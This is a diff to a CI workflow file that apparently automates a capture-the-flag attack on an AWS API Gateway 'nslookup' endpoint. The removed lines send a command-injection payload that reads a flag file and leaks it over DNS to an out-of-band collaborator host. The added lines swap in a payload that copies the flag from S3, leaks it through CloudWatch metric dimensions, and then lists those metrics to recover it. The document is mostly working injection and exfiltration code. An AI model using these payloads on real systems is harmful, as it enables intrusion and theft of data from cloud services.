@@ -25,11 +25,15 @@ jobs:
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          # Replace YOUR_SUBDOMAIN with your DNS collaborator host (e.g., xxx.oastify.com or xxx.interact.sh)
-          COLLABORATOR="gehqptlfvfkfakfpbqdzb6kmjoqjcnjzs.oast.fun"
-          
-          PAYLOAD="{\"domain\": \"127.0.0.1; FLAG=\$(cat /var/task/flag.txt | base64 | tr -d '\n'); dig \$FLAG.$COLLABORATOR\"}"
+          echo "=== 1. PUSHING FLAG TO CLOUDWATCH METRICS ==="
+          # Read flag, base64 encode it, and store it in a custom metric name or value
+          PAYLOAD='{"domain": "127.0.0.1; FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 | base64 | tr -d \"\\n\"); aws cloudwatch put-metric-data --namespace \"CTF/Flag\" --metric-name \"ExfiltratedFlag\" --value 1 --dimensions FlagValue=$FLAG --region us-east-1"}'
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
+          
+          sleep 3
+          
+          echo "=== 2. READING METRIC DATA VIA CICDROLE ==="
+          aws cloudwatch list-metrics --namespace "CTF/Flag" --region us-east-1
